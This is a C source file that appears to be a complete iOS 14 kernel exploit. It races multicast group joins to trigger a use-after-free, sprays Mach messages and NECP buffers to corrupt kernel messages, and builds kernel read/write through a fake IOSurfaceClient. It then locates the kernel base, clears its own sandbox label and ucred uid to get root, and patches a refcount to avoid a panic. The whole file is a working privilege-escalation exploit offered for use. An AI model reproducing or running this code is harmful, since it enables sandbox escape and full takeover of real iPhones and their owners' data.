#include "main.h"
#include "ENABLE_HELPER.h"

#include "iokit.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"
#include "xpaci.h" // ptrauth.h replacement

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>



#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#define BYTECOPY_FIRST_TARGET KHEAP_DATA_MAPPABLE_LOC + 0x3F4C - BYTECOPY_OFFSET_IPV6
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0xFA4 + 0xB6 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28
#define PORTS_COUNT 0x3A00
#define KMSG_SIZE 0x2F78 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

#define IOSURFACE_SPRAY_UCS_COUNT 10

mach_port_t notif_port = MACH_PORT_NULL;
uint8_t *IOSurfaceClient_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;
io_connect_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
uint32_t last_surf_id = 0;
uint64_t IOSurfaceRootUserClient_ptr = 0;

mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x288) = BYTECOPY_FIRST_TARGET;

    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx : %d\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 14.2 - 14.8.1 and reboot to try again\n");
        exit(1);
    }
    
    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void)
{
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x10000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x10000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x2F5C) = BYTECOPY_SECOND_TARGET;
    
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t desc_pad[9]; // TODO remove hack
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    struct default_msg *msg = (struct default_msg *)kheap_data_spray_buf;
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = KMSG_SIZE;
    msg->body.msgh_descriptor_count = 10; // TODO remove hack
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = (0x10000-8)/8;
    msg->desc.address = (void *)ool_ports;
     
    // prepare all ports first
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        contained_ports[i] = port_new();
        kheap_data_ports[i] = port_new();
    }
    
    // spray fast
    for (unsigned int i = 0; i < PORTS_COUNT; ++i)
    {
       *ool_ports = contained_ports[i];
       msg->hdr.msgh_remote_port = kheap_data_ports[i];
       kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
       if (kr) {
           *(int *)1 = 0;
       }
    }
        
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    
    // pre-init kernel rw
    IOSurfaceClient_buf = calloc(1, 0x10000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    pipe(fildes);
    int read_pipe2 = fildes[0];
    int write_pipe2 = fildes[1];
    
    uint8_t null_buf[0x10000] = {0};
    uint8_t msg_buf[0x10000] = {0};
    uint8_t buf41[0x10000] = {0};
    memset(buf41, 0x41, 0x10000);
    
    // alloc these before array of IOSurfaceClients becomes 0x10000
    mach_port_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_spray_ucs[i] = IOSurfaceRoot_init();
    }
    
    // cause max size of arrays of IOSurfaceClients to become 0x10000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x10000();
    
    // TODO fill 0x10000 gaps here
    
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    
    write(write_pipe2, null_buf, 0x10000-1);
    
    printf("Past first refill\n");
  
    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int orig_holder_idx = -1;
    for (uint32_t i = PORTS_COUNT-1;
         (i > 0) && port_has_msg(notif_port);
         --i)
    {
        // skip already free'd index and its adjacent locs which we'll use later
        if (i == kheap_data_idx || i == kheap_data_idx - 1 || i == kheap_data_idx - 2)
        {
            continue;
        }
        
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_data_ports[i]);

        orig_holder_idx = i;
    }
    
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        IOSurfaceRoot_lookup_surface(iosurface_spray_ucs[i], last_id);;
    }
    printf("orig_holder_idx %d/%d, last_id, 0x%08X\n", orig_holder_idx, PORTS_COUNT, last_id);
    
    // read out IOSurfaceClient
    read(read_pipe2, msg_buf, 0x10000-1);
    uint64_t *src = (uint64_t *)msg_buf;
    uint64_t IOSurfaceClient_ptr = src[last_id];
    printf("IOSurfaceClient ptr: %p\n", (void *)IOSurfaceClient_ptr);
    
    // point a fake IOSurfaceClient to kheap data
    uint64_t redirect[0x100];
    for (int i = 0; i < 0x100; ++i)
        redirect[i] = KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10;
    write(write_pipe2, redirect, 0x10000-1);
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    kheap_data_ports[kheap_data_idx-1] = MACH_PORT_NULL;
    write(write_pipe, IOSurfaceClient_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    // find krw
    printf("Find krw...\n");

    int found = 0;
    io_connect_t iosurface_connect_krw = 0;
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_connect_krw = iosurface_spray_ucs[i];
        
        kernel_rw_init(iosurface_connect_krw, 2, read_pipe, write_pipe);
        uint32_t orig = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, 0xFEED);
        uint32_t result = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, orig);
        if (result == 0xFEED)
        {
            printf("Test kwrite32 and kread32: %08X (should be 0000FEED) at %d\n", result, i);
            found = 1;
            break;
        }
    }
    if (!found)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }

    printf("Get kernel base...\n");
    
    uint64_t vtable = xpaci(kread64(IOSurfaceClient_ptr));
    printf("IOSurfaceClient vtable: %p\n", (void *)vtable);
    
    // find kernel base
    uint64_t pos = (vtable & ~0x3FFF);
    do
    {
        pos -= 0x4000;
    } while (kread32(pos) != 0xFEEDFACF);
    *kernel_base = pos;
    printf("Got kernel base: %p\n", (void *)*kernel_base);

    do {
        uint64_t surface = kread64(IOSurfaceClient_ptr + 0x40);
        if (surface) {
            uint64_t task = xpaci(kread64(surface + 0x70));
            if (!task) break;
            // TODO This offset changes throughout iOS 14...
            // 14.5 beta 2 and above: 0x3B0 on arm64e, 0x398 on arm64
            // 14.5 beta 1 and below: 0x3A0 on arm64e, 0x390 on arm64
            uint64_t proc = xpaci(kread64(task + 0x3B0));
            if (!proc) break;
            uint64_t ucred = xpaci(kread64(proc + 0xF0));
            if (!ucred) break;
            uint64_t label = xpaci(kread64(ucred + 0x78));
            if (!label) break;
            printf("Our task: 0x%llX\n", task);
            printf("Our proc: 0x%llX\n", proc);
            printf("Our ucred: 0x%llX\n", ucred);
            printf("Our label: 0x%llX\n", label);
            
            kwrite64(label + (2 * sizeof(uint64_t)), 0);
            kwrite32(ucred + 0x20, 0);
            
            setuid(0); 
            setuid(0);
            
            if (getuid()) {
                printf("Failed to escalate to root\n");
                break;
            }
            printf("getuid() -> 0\n");
            printf("Escalated to root and unsandboxed\n");
        }
    } while (0);

    // Prevent panic on exit
     IOSurfaceRootUserClient_ptr = xpaci(kread64(IOSurfaceClient_ptr + 0x10));
    printf("IOSurfaceRootUserClient_ptr: %p\n", (void *)IOSurfaceRootUserClient_ptr);
    uint32_t refs = kread32(IOSurfaceRootUserClient_ptr + 8);
    kwrite32(IOSurfaceRootUserClient_ptr + 8, refs + 1); // leak a ref, so that we won't panic on exit;
    
    setuid(501); // Fix Xcode not being able to kill the app
    
    // TODO cleanup any other no longer needed IOSurface resources here
    
    return 0;
}

void exploitation_cleanup(void)
{
    
}

int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
{
    uint64_t _kernel_base = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
    
    // generic exploitation cleanup (kernel r/w still active)
    exploitation_cleanup();
    
    *kernel_base = _kernel_base;
    
    return 0;
}

int main(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}
